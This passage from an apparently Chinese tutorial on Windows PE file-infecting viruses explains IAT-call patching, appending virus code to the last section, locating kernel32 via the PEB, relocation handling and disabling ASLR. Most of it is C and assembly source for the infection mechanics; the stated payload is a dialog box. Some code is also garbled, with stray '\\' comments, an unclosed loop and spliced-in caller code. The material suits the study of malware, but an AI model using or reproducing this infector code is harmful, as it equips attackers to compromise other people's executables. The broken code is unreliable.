class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">patchApiCall</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      FILE * fp, </span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">char</span> * funcName,         <span class="comment">//API函数的名字（要被Patch的调用指令）</span></span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">char</span> * dllName,          <span class="comment">//API函数所属DLL的名字</span></span></span></span><br><span class="line"><span class="function"><span class="params">      IMAGE_NT_HEADERS* hdrs,  <span class="comment">//NT头的信息</span></span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">int</span> jmpDesAddress        <span class="comment">//跳转的地址，病毒首地址</span></span></span></span><br><span class="line"><span class="function"><span class="params">      )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//在文件中找到导入表的位置</span></span><br><span class="line">  <span class="keyword">bool</span> result = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//找到导入表的RVA</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> importTbRva = hdrs-&gt;</span><br><span class="line">OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;</span><br><span class="line"><span class="keyword">if</span> (importTbRva == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;has not import tb, so exit\n&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将RVA转换为导入表的文件位置</span></span><br><span class="line"><span class="keyword">int</span> importTbOffset = </span><br><span class="line">  getFileOffsetByRva(fp, hdrs-&gt;FileHeader.NumberOfSections, importTbRva);</span><br><span class="line"><span class="keyword">if</span> (importTbOffset == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;cannot locate import tb\n&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//找到指定API函数在IAT表中的表项地址</span></span><br><span class="line">    _IMAGE_IMPORT_DESCRIPTOR importDes;  <span class="comment">//指向结构体（导入表目录项）定义变量</span></span><br><span class="line"><span class="keyword">int</span> targetIATAddress = <span class="number">0</span>;  <span class="comment">//变量，指定API函数在IAT表中的表项地址（RVA），初始化为0</span></span><br><span class="line"><span class="keyword">int</span> desIndex = <span class="number">0</span>; <span class="comment">//遍历的索引</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) <span class="comment">//找到就退出循环</span></span><br><span class="line">&#123; <span class="comment">//每次定位到结构体开始的位置 </span></span><br><span class="line">  fseek(fp, importTbOffset + desIndex * <span class="keyword">sizeof</span>(_IMAGE_IMPORT_DESCRIPTOR), SEEK_SET);</span><br><span class="line">  <span class="comment">//读结构体到变量</span></span><br><span class="line">  fread(&amp;importDes, <span class="keyword">sizeof</span>(_IMAGE_IMPORT_DESCRIPTOR), <span class="number">1</span>, fp);</span><br><span class="line">  desIndex++; <span class="comment">//循环索引加1</span></span><br><span class="line">  <span class="keyword">if</span> (importDes.FirstThunk == <span class="number">0</span>)  <span class="comment">//如果IAT表为0，跳出循环</span></span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">  <span class="comment">//将结构体中DLL名字的RVA转换成文件位置</span></span><br><span class="line">  <span class="keyword">int</span> offset = getFileOffsetByRva(fp, hdrs-&gt;FileHeader.NumberOfSections, importDes.Name);</span><br><span class="line">  <span class="comment">//将DLL的文件名读出，放到name数组里面</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">128</span>];</span><br><span class="line">  fseek(fp, offset, SEEK_SET);</span><br><span class="line">  <span class="keyword">char</span> * p = name;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    fread(p, <span class="number">1</span>, <span class="number">1</span>, fp);  <span class="comment">//每次读一个字节</span></span><br><span class="line">    <span class="keyword">if</span> (* p == <span class="number">0</span>)  <span class="comment">//字符串结束标识符</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    p++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//以上代码取出导入表目录项中的DLL名字，用来和函数传递的参数dllName（即API函数的DLL）进行比较</span></span><br><span class="line"><span class="keyword">if</span> (stricmp(name, dllName) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//比较dll的名字，判断是否是API函数所在DLL的导出表目录项</span></span><br><span class="line"><span class="comment">//根据预先绑定，如果有INT就用INT表来找函数名，没有就用IAT表找函数名</span></span><br><span class="line"><span class="keyword">long</span> actualFirstThunk = importDes.OriginalFirstThunk == <span class="number">0</span> ? </span><br><span class="line">          importDes.FirstThunk : importDes.OriginalFirstThunk;</span><br><span class="line"><span class="comment">//获得INT表（或IAT表）的RVA，并将其转换为文件位置</span></span><br><span class="line"><span class="keyword">int</span> nameListStart = getFileOffsetByRva(fp, hdrs-&gt;FileHeader.NumberOfSections, actualFirstThunk);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; ; i++) <span class="comment">//遍历INT表（或IAT表）的每一项，查找指定的API函数名</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> thunkRva;   <span class="comment">//每项的RVA字段，注意Peview工具解析了很多信息，但表里每项只有RVA</span></span><br><span class="line">  fseek(fp, nameListStart + i * <span class="keyword">sizeof</span>(thunkRva), SEEK_SET); <span class="comment">//定位到i项的文件位置    </span></span><br><span class="line">  fread(&amp;thunkRva, <span class="keyword">sizeof</span>(thunkRva), <span class="number">1</span>, fp); <span class="comment">//读每项信息到变量</span></span><br><span class="line">  <span class="keyword">if</span> (thunkRva == <span class="number">0</span>)  <span class="comment">//表的结束符为0</span></span><br><span class="line">  &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;find dll %s but not find who call %s\n&quot;</span>, dllName, funcName);</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> thunkOffset =   \\将读出的RVA（如<span class="number">2</span>A270）转换为文件位置（转为<span class="number">28270</span>） </span><br><span class="line">   getFileOffsetByRva(fp, hdrs-&gt;FileHeader.NumberOfSections, thunkRva);</span><br><span class="line">  fseek(fp, thunkOffset + <span class="number">2</span>, SEEK_SET);\\定位到函数名，跳过<span class="number">2</span>字节序号</span><br><span class="line">  fread(name, <span class="keyword">sizeof</span>(name), <span class="number">1</span>, fp); \\读函数名到name</span><br><span class="line"> <span class="keyword">if</span> (stricmp(name, funcName) == <span class="number">0</span>)</span><br><span class="line">  &#123; <span class="comment">//和传递的参数funcName作比较</span></span><br><span class="line">    <span class="comment">//找到，计算IAT表相应表项的位置</span></span><br><span class="line">    targetIATAddress =</span><br><span class="line">     hdrs-&gt;OptionalHeader.ImageBase + importDes.FirstThunk + <span class="number">4</span> * i;</span><br><span class="line">   <span class="keyword">break</span>;<span class="comment">//break前面的for循环</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;<span class="comment">//break前面的while循环</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//找到符合的指令进行Patch</span></span><br><span class="line">    IMAGE_SECTION_HEADER curHdr;</span><br><span class="line">locateNTHdrStart(fp);  <span class="comment">//定位到NT头的文件位置</span></span><br><span class="line">fseek(fp, <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS), SEEK_CUR);<span class="comment">//定位到节表</span></span><br><span class="line"><span class="comment">//遍历节表找代码节，指令在代码节</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; hdrs-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123; </span><br><span class="line">  <span class="comment">//读出节头</span></span><br><span class="line">  fread(&amp;curHdr, <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), <span class="number">1</span>, fp);</span><br><span class="line">  <span class="keyword">if</span> ((curHdr.Characteristics &amp; <span class="number">0x20</span>) == <span class="number">0x20</span>) <span class="comment">//查找代码属性0x20</span></span><br><span class="line">  &#123;</span><br><span class="line">     <span class="keyword">char</span> *code = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(curHdr.Misc.VirtualSize); </span><br><span class="line">     fread(code, <span class="number">1</span>, curHdr.Misc.VirtualSize, fp); <span class="comment">//读出节的内容到code数组</span></span><br><span class="line"><span class="keyword">char</span> * p = code;  <span class="comment">//p指向代码节当前搜索位置，初始化为code开始的地方</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i2 = <span class="number">0</span>; i2 &lt; curHdr.Misc.VirtualSize;)  <span class="comment">//循环遍历每个字节</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">short</span> opCode = *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)p; <span class="comment">//每次读2个字节，进行操作码FF15和FF25判断</span></span><br><span class="line">   <span class="keyword">if</span> (( opCode == <span class="number">0x15ff</span>) || (opCode == <span class="number">0x25ff</span>)) <span class="comment">//找到FF15或FF25</span></span><br><span class="line">   &#123;  <span class="comment">//p+2为FF15或FF25后面，int读4个字节，是可能的IAT表项的RVA地址</span></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> possibleIATAddress = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *) (p + <span class="number">2</span>); </span><br><span class="line">      <span class="keyword">if</span> (targetIATAddress == possibleIATAddress) <span class="comment">//和读出的IAT表的RVA一致</span></span><br><span class="line">      &#123;  result = <span class="literal">true</span>; <span class="comment">//进行指令Patch</span></span><br><span class="line">         <span class="keyword">char</span> instr[<span class="number">6</span>];</span><br><span class="line">         <span class="keyword">if</span> (opCode == <span class="number">0x15ff</span>) <span class="comment">//FF15对应间接call[xx]，只能替换成call指令</span></span><br><span class="line">         &#123;  instr[<span class="number">0</span>] = <span class="number">0xe8</span>;<span class="comment">//替换call的机器码e8</span></span><br><span class="line">            instr[<span class="number">5</span>] = <span class="number">0x90</span>;<span class="comment">//最后一个字节需要填充NOP</span></span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span> <span class="comment">//是jmp[xx]，替换为jmp指令</span></span><br><span class="line">            instr[<span class="number">0</span>] = <span class="number">0xe9</span>;<span class="comment">//替换成jmp指令机器码e9</span></span><br><span class="line">         <span class="comment">//计算跳转偏移量，先计算跳转的源地址:节起始RVA + imageBase + Patch指令后面的节内偏移 </span></span><br><span class="line">         <span class="keyword">long</span> srcAddress = curHdr.VirtualAddress + </span><br><span class="line">                              hdrs-&gt;OptionalHeader.ImageBase + </span><br><span class="line">                                                        (p + <span class="number">5</span> - code);</span><br><span class="line">         *(<span class="keyword">long</span> *)&amp;instr[<span class="number">1</span>] = jmpDesAddress - srcAddress; <span class="comment">//填写跳转偏移,跳转目的地址-源地址</span></span><br><span class="line">         fseek(fp, curHdr.PointerToRawData + (p - code), SEEK_SET); <span class="comment">//定位到patch指令</span></span><br><span class="line">         fwrite(instr, <span class="number">1</span>, <span class="number">6</span>, fp); <span class="comment">//写入patch指令</span></span><br><span class="line">         i2 += <span class="number">6</span>;</span><br><span class="line">         p += <span class="number">6</span>;</span><br><span class="line">         <span class="keyword">continue</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   i2 +=<span class="number">2</span>; p += <span class="number">2</span>; </span><br><span class="line"><span class="comment">//获得病毒代码开始位置的内存地址，是patch指令函数patchApiCall的参数</span></span><br><span class="line"><span class="keyword">long</span> jmpDesAddress = lastSectionHdr.VirtualAddress + </span><br><span class="line">     lastSectionHdr.Misc.VirtualSize + ntHdrs.OptionalHeader.ImageBase;</span><br><span class="line"><span class="comment">//0代表没找到给定函数的调用指令</span></span><br><span class="line"><span class="comment">//1代表找到了GetCommandLineA的调用指令进行了Patch</span></span><br><span class="line"><span class="comment">//2代表找到了GetCommandLineW的调用指令进行了Patch</span></span><br><span class="line"><span class="keyword">int</span> thefunc = <span class="number">0</span>; <span class="comment">//初始化为0</span></span><br><span class="line"><span class="comment">//调用patchApiCall函数，返回值代表是否Patch成功</span></span><br><span class="line"><span class="keyword">if</span> (patchApiCall(fp, <span class="string">&quot;GetCommandLineA&quot;</span>, <span class="string">&quot;kernel32.dll&quot;</span>, &amp;ntHdrs, jmpDesAddress))</span><br><span class="line">  thefunc = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (patchApiCall(fp, <span class="string">&quot;GetCommandLineW&quot;</span>, <span class="string">&quot;kernel32.dll&quot;</span>, &amp;ntHdrs, jmpDesAddress))</span><br><span class="line">  thefunc = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (thefunc == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span>; <span class="comment">//没有patch成功，直接返回，不寄生</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//布尔型变量isGetCommandLineW，用于告诉后面的病毒寄生代码Patch的到底是哪个函数</span></span><br><span class="line"><span class="keyword">bool</span> iscommandLineW = (thefunc == <span class="number">1</span> ? <span class="literal">false</span> : <span class="literal">true</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="针对导入表项调用指令patch的病毒设计"><a class="markdownIt-Anchor" href="#针对导入表项调用指令patch的病毒设计"></a> 针对导入表项调用指令Patch的病毒设计</h2><ol><li>我们准备patch调用GetCommandLineA或GetCommandLineW的函数，因为它们基本在入口处会被调用，这样可以保证病毒一开始就执行</li><li>为了防止函数再次调用时病毒再次执行，我们增加了一个标记</li><li>另外，感染时到底patch的是W还是A版的GetCommandLine，也有一个标记来告诉寄生的病毒代码，从而寄生病毒执行时才知道去找哪个函数的实际入口地址</li><li>寄生病毒执行时，找到函数地址后需要存储一下，因此，并分配了4字节存储GetCommandLineX（W/A）的入口地址。为了不修改老代码，数据区开始的原来13个字节没有删减，用于存放这3个信息。</li><li>在数据段增加了“GetCommandLineA”和” GetCommandLineW”串，因为要用getproc动态查找到其首址跳过去</li><li>增加了获取kernel32基址和获取GetCommandLineW/A的代码</li><li>最后用JMP指令跳到GetCommandLineW/A去</li></ol><h3 id="最后跳转指令"><a class="markdownIt-Anchor" href="#最后跳转指令"></a> 最后跳转指令</h3><ol><li>在patch指令的时候，我们将原来的call [xxxx] ，Jmp [xxxx] 变成一条“Jmp 偏移”形式的指令跳到病毒，在病毒代码执行后，我们需要在尾部添加一条跳回原来函数[xxxx]的指令</li><li>因此，我们依然添加一条 Jmp [xxxx] 的间接跳转指令。这样我们就不必自己查找原函数的入口了，节省了代码</li><li>但该方法因为 Jmp [xxxx] 包含的地址xxxx是绝对地址（这是函数所对应的IAT表项的地址），如果在exe可重定位的情况下，这个xxxx地址是需要重定位的</li><li>然而，病毒尾部的这条Jmp [xxxx]是病毒添加的，因此，在重定位表中没有重定位项的，所以会出错</li><li>解决的方法：添加重定位项或让exe不会重定位</li></ol><h3 id="病毒数据区"><a class="markdownIt-Anchor" href="#病毒数据区"></a> 病毒数据区</h3><p><img src="/images/%E7%97%85%E6%AF%92-Win-%E6%8C%87%E4%BB%A4Patch%E5%AE%9E%E7%8E%B0%E5%92%8C%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8/image-20210520210019073.png" alt="image-20210520210019073" /></p><p>初始化数据区代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//填写GetCommandLineA字符串，相对数据区偏移56字节</span></span><br><span class="line"><span class="built_in">strcpy</span>(virusData + <span class="number">56</span>, <span class="string">&quot;GetCommandLineA&quot;</span>);</span><br><span class="line"><span class="comment">//填写GetCommandLineW字符串，相对数据区偏移72字节</span></span><br><span class="line"><span class="built_in">strcpy</span>(virusData + <span class="number">72</span>, <span class="string">&quot;GetCommandLineW&quot;</span>);</span><br><span class="line"><span class="comment">//传递一个布尔型变量isGetCommandLineW</span></span><br><span class="line"><span class="comment">//根据其值决定是patch函数的W版还是A版，并记录在数据区标志位</span></span><br><span class="line">*(virusData + <span class="number">1</span>) = isGetCommandLineW ? <span class="number">1</span> : <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>判断是否第一次执行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pop eax;  <span class="comment">//病毒数据区自定位指令，eax指向病毒数据区实际地址</span></span><br><span class="line">cmp byte ptr [eax], <span class="number">1</span>; <span class="comment">//判断病毒是否为第一次执行</span></span><br><span class="line">jnz  first_time; <span class="comment">//病毒是第一次执行，跳到first_time标号处执行</span></span><br><span class="line"><span class="comment">//如果不是，说明病毒已经执行了，并获得GetCommandLine函数的地址</span></span><br><span class="line">mov eax, [eax + <span class="number">2</span>];  <span class="comment">//这个是由后面的first_time代码把函数地址放入数据区的</span></span><br><span class="line">jmp eax;  <span class="comment">//跳到getcommmandLineX函数</span></span><br><span class="line"></span><br><span class="line">first_time:</span><br><span class="line"> mov [eax], <span class="number">1</span>;  <span class="comment">//将是否执行标志为置为已执行</span></span><br><span class="line"> mov ebp, eax;  <span class="comment">//ebp执行病毒数据区</span></span><br><span class="line"> …… <span class="comment">//执行病毒的逻辑，弹出对话框</span></span><br></pre></td></tr></table></figure><p>尾部添加代码，完成函数入口的查询和转跳：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  push <span class="number">16</span>;  <span class="comment">//压栈函数名的长度GetCommandLineX（W/A）的长度，getProc函数的参数</span></span><br><span class="line">  mov bl, [ebp + <span class="number">1</span>]; <span class="comment">//判断patch的函数是否为W版本，ebp指向的是数据区</span></span><br><span class="line">  test bl, bl</span><br><span class="line">  jnz xxW  <span class="comment">//patch的是W版本</span></span><br><span class="line">  lea eax, [ebp + <span class="number">56</span>];  <span class="comment">//获得字符串“getCommandLineA”的首地址</span></span><br><span class="line">  jmp xx2</span><br><span class="line">xxW:</span><br><span class="line">  lea eax, [ebp + <span class="number">72</span>];  <span class="comment">//获得字符串“getCommandLineW”的首地址</span></span><br><span class="line">xx2：</span><br><span class="line">  push eax;          <span class="comment">//将函数名压栈，getProc函数的参数</span></span><br><span class="line">  <span class="comment">//获得kernel32.dll的基地址</span></span><br><span class="line">  mov  eax, fs:[<span class="number">30</span>h]  <span class="comment">//eax执行PEB</span></span><br><span class="line">  mov  eax, [eax+<span class="number">0</span>ch] <span class="comment">//eax指向PEB_LDR</span></span><br><span class="line">  mov  eax, [eax+<span class="number">0</span>ch] <span class="comment">//eax指向第一个模块，即exe模块</span></span><br><span class="line">  mov  eax, [eax]     <span class="comment">//eax指向第二个模块，即ntdll.dll</span></span><br><span class="line">  mov  eax, [eax]     <span class="comment">//eax指向第三个模块，即kernel32.dll</span></span><br><span class="line">  mov  eax, [eax+<span class="number">18</span>h] <span class="comment">//在该模块偏移18h的地方获得kernel32.dll的基地址</span></span><br><span class="line">  push eax   <span class="comment">//将kernel32.dll基地址压栈，getProc函数的参数</span></span><br><span class="line">  call getproc   <span class="comment">//调用getProc函数，返回eax为函数的地址</span></span><br><span class="line">  mov dword ptr [ebp + <span class="number">2</span>], eax  <span class="comment">//ebp指向数据区，在数据区放入函数地址</span></span><br><span class="line">  …… <span class="comment">//平衡栈</span></span><br><span class="line">  jmp eax; <span class="comment">//跳到GetCommandLineX函数</span></span><br></pre></td></tr></table></figure><h3 id="病毒代码改进"><a class="markdownIt-Anchor" href="#病毒代码改进"></a> 病毒代码改进</h3><ol><li>病毒代码比较大，基本节的空洞放不下了</li><li>最后跳回到getCommandLine函数时利用本来的IAT表项</li></ol><p>增加最后节的字长：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改最后节的virtualSize字段</span></span><br><span class="line">fseek(fp, - <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), SEEK_CUR); <span class="comment">//定位到节头</span></span><br><span class="line">fseek(fp, <span class="number">8</span>, SEEK_CUR);<span class="comment">//移动8字节的节名，定位到virtualSize字段</span></span><br><span class="line"><span class="keyword">int</span> newVirtualSize = lastSectionHdr.Misc.VirtualSize + codeSize; <span class="comment">//计算新的virtualSize的值</span></span><br><span class="line">fwrite(&amp;newVirtualSize, <span class="keyword">sizeof</span>(newVirtualSize), <span class="number">1</span>, fp); <span class="comment">//写入virtualSize的值</span></span><br><span class="line"><span class="comment">//修该最后节的SizeOfRawData</span></span><br><span class="line">fseek(fp, <span class="number">4</span>, SEEK_CUR); <span class="comment">//定位到节头的SizeOfRawData字段</span></span><br><span class="line"><span class="keyword">int</span> pageNum = (newVirtualSize / ntHdrs.OptionalHeader.FileAlignment); <span class="comment">//除以文件对齐粒度</span></span><br><span class="line">pageNum = pageNum * ntHdrs.OptionalHeader.FileAlignment &lt; newVirtualSize </span><br><span class="line">                   ? pageNum + <span class="number">1</span> : pageNum;  <span class="comment">//计算新的pageNum</span></span><br><span class="line"><span class="keyword">int</span> size = pageNum * ntHdrs.OptionalHeader.FileAlignment;   <span class="comment">//计算新的SizeOfRawData</span></span><br><span class="line">fwrite(&amp;size, <span class="keyword">sizeof</span>(size), <span class="number">1</span>, fp);  <span class="comment">//将SizeOfRawData的值写入文件</span></span><br><span class="line"><span class="comment">//定位到最后节的空洞</span></span><br><span class="line">fseek(fp, lastSectionHdr.PointerToRawData + lastSectionHdr.Misc.VirtualSize, SEEK_SET);</span><br><span class="line">fwrite(code, codeSize, <span class="number">1</span>, fp);    <span class="comment">//先填充病毒代码</span></span><br><span class="line"><span class="built_in">free</span>(code);</span><br><span class="line"><span class="comment">//在病毒代码后继续扩容</span></span><br><span class="line"><span class="keyword">int</span> expandedSize = size - newVirtualSize;   <span class="comment">//计算需要扩充的大小，从病毒代码后开始填充</span></span><br><span class="line"><span class="keyword">char</span> c = <span class="number">0</span>; <span class="comment">//每次填充0</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; expandedSize; i++)  <span class="comment">//循环填充的次数</span></span><br><span class="line">fwrite(&amp;c, <span class="number">1</span>, <span class="number">1</span>, fp);  <span class="comment">//填充一个字节</span></span><br></pre></td></tr></table></figure><p>利用IAT找到函数入口：</p><ol><li>call…pop自定位代码获取了数据区的地址A</li><li>数据区预期加载地址B=[A+1]</li><li>IAT表项的预期地址[A+5]</li><li>IAT表项重定位后的实际地址IAT_addr-[A+5]=A-B</li><li>通过[IAT_addr]获取函数入口地址</li></ol><h2 id="pe文件的重定位机制"><a class="markdownIt-Anchor" href="#pe文件的重定位机制"></a> PE文件的重定位机制</h2><h3 id="算法"><a class="markdownIt-Anchor" href="#算法"></a> 算法</h3><ol><li>实际和预期加载地址的差x=A-B</li><li>找到需要修改的位置y</li><li>读出y开始4字节的值+x=新地址z</li><li>将z写入y开始的4字节</li></ol><h3 id="如何知道哪些需要重定位"><a class="markdownIt-Anchor" href="#如何知道哪些需要重定位"></a> 如何知道哪些需要重定位</h3><p>在可选头的数据目录中，有一项（第六项）就是重定位表，重定位表中记录了所有需要进行重定位修改的<strong>位置</strong></p><p>在重定位表中因为都是地址值，所以只记录被修改的位置，大小4字节（32位机）</p><p>需要重定位的区域以4096（2^12）字节（即16进制0x1000h）进行划分，在每个区域（Page）里面，每个需要重定位的位置都有相应的重定位项记录了该位置离这个区域起始位置的偏移</p><p>针对每个区域，在重定位表中都有8字节的头部，其中前4个字节是重定位内存页的起始RVA，后4个字节是重定位块的长度（包括头和所有表项在内的字节数）</p><p>划分区域后每一项只需要12位来表示地址，另外0.5字节为属性</p><blockquote><p>系统重定位算法，从OptionHeader的数据目录项拿到重定位表首，然后遍历上面的数据表结构，获取每个重定位项，计算重定位项的位置，按之前的算法重定位</p></blockquote><h3 id="总结patch指令引起的问题"><a class="markdownIt-Anchor" href="#总结patch指令引起的问题"></a> 总结Patch指令引起的问题</h3><p>因为我们Patch的原指令本身是包含绝对地址的指令，对于exe能重定位的情况下，正常会有指向这个绝对地址xxxx所在位置的重定位项</p><p>在我们Patch指令的过程中，我们将该指令修改为了不包含绝对地址的指令形式，但没有删除针对该地址的重定位项</p><p>解决方法：exe重定位项失效；删除被Patch指令的重定位项</p><h3 id="解决方法"><a class="markdownIt-Anchor" href="#解决方法"></a> 解决方法</h3><ol><li><p>关闭随机基址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">        readHdrs(fp); <span class="comment">//读NT头</span></span><br><span class="line">locateNTHdrStart(fp);  <span class="comment">//定位到NT头</span></span><br><span class="line"><span class="comment">//计算dllcharacteristics到NTHeaders头部偏移</span></span><br><span class="line"><span class="keyword">int</span> offsetToNTHdr_DllChar = (<span class="keyword">int</span>)&amp;(((IMAGE_NT_HEADERS *) <span class="number">0</span>)-&gt;</span><br><span class="line">                    OptionalHeader.DllCharacteristics);</span><br><span class="line">        <span class="comment">//从NT头移动文件指针到dllcharacteristics字段的位置</span></span><br><span class="line">fseek(fp, offsetToNTHdr_DllChar, 